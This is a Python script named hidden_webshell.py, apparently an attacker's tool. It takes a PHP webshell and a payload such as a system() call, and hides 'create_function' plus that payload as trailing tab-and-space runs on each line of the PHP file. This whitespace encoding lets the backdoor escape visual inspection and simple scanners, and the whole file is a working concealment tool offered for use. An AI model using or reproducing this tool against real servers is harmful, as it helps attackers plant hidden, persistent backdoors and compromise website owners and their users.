import sys

def put_color(string, color):
    colors = {
        'red': '31',
        'green': '32',
        'yellow': '33',

        'blue': '34',
        'pink': '35',
        'cyan': '36',
        'gray': '2',
        'white': '37',
    }

    return '\033[40;1;%s;40m%s\033[0m' % (colors[color], str(string))

if len(sys.argv) not in [3, 4]:
    sys.exit(
        '''[!] usage: python hidden_webshell.py payload filename [output_filename]\n'''
        '''  [-] example: python {}{}{}'''.format(
            put_color('hidden_webshell.py', 'white'),
            put_color(''' 'system("echo \\"hacked by Tr0y :)\\"");' ''', 'green'),
            put_color('webshell.php', 'blue')
        )
    )

webshell_name = sys.argv[2]
hidden_name = sys.argv[3] if len(sys.argv) == 4 else 'webshell_hidden.php'
exp = sys.argv[1]  # '''system("echo 'hacked by Tr0y :)'");'''
if not exp.endswith(';'):
    print('[!] WARN: {} {}'.format(
        put_color('The payload should end in', 'yellow'),
        put_color(';', 'cyan')
    ))

print('[+] Hide webshell')
print('  [-] Read from {}'.format(put_color(webshell_name, 'blue')))
print('  [-] Payload is {}'.format(put_color(exp, 'green')))

payload = 'create_function' + exp

with open(webshell_name, 'r') as fp:
    raw_php = fp.readlines()

for line, content in enumerate(payload):
    hex_num = hex(ord(content))
    tab_num = int(hex_num[2], 16)
    space_num = int(hex_num[3], 16)  # 最好用空格的个数代表个位数

    hidden = '\t' * tab_num + ' ' * space_num
    if line < len(raw_php):
        if raw_php[line].endswith('\n'):
            raw_php[line] = raw_php[line][:-1] + hidden + '\n'
        else:
            raw_php[line] = raw_php[line] + hidden
    else:
        raw_php.append(hidden + "\n")

with open(hidden_name, 'w') as fp:
    fp.writelines(raw_php)

print('[!] Saved as {}'.format(put_color(hidden_name, 'blue')))
print('[!] All done\n\nBye :)')